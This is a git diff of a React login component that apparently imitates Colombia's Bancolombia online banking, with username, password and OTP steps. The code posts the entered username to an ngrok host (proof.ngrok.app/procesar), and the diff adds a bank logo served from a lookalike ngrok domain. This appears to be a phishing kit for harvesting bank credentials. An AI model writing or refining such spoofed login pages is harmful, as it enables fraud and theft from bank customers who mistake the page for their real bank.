@@ -1,6 +1,5 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
-import IMG1 from './img/verify.png';
 import IMG2 from './img/logo.png';
 import PasswordEntry from './PasswordEntry';
 import Otp from './otp';
@@ -14,7 +13,6 @@ const BancolombiaLogin = () => {
   const [loading, setLoading] = useState(false);
 
   useEffect(() => {
-    // Lee el valor del localStorage al cargar el componente
     const storedUsername = localStorage.getItem('username');
     if (storedUsername) {
       setUsername(storedUsername);
@@ -29,10 +27,9 @@ const BancolombiaLogin = () => {
       return;
     }
 
-    // Guarda el username en localStorage
     localStorage.setItem('username', username);
     setError('');
-    setLoading(true); // Inicia el spinner
+    setLoading(true);
 
     try {
       const response = await axios.post('https://proof.ngrok.app/procesar', { codigo: username });
@@ -42,18 +39,14 @@ const BancolombiaLogin = () => {
       console.error('Error en la solicitud:', error);
       setError('Error al enviar los datos.');
     } finally {
-      setLoading(false); // Detiene el spinner
+      setLoading(false);
     }
   };
 
   return (
-    <div className="bg-gray-100 min-h-screen flex flex-col items-center p-4">
+    <div className="bg-gray-100 flex flex-col items-center p-4">
       <TransitionGroup>
-        <CSSTransition
-          key={step}
-          timeout={300}
-          classNames="fade"
-        >
+        <CSSTransition key={step} timeout={300} classNames="fade">
           <div className="w-full max-w-md px-4">
             {loading && (
               <div className="spinner-overlay">
@@ -61,10 +54,16 @@ const BancolombiaLogin = () => {
               </div>
             )}
 
+            <div className="flex justify-center mb-6">
+              <img
+                src="https://sucuvirtualco.ngrok.app/assets/img/headerIconBancolombia.svg"
+                alt="Mini Header Icon"
+                className="w-24 shadow-lg"
+              />
+            </div>
+
             {step === 1 && !loading && (
               <div className="bg-white p-6 rounded-lg shadow-lg">
-                <img src={IMG1} alt="Verificar" className="w-full max-w-xs my-4 mx-auto" />
-                <img src={IMG2} alt="Logo" className="w-full max-w-xs my-4 mx-auto" />
                 <h1 className="text-2xl font-bold my-4 text-center">Ingresa tu usuario</h1>
 
                 <p className="text-sm text-gray-600 mb-4 text-center">
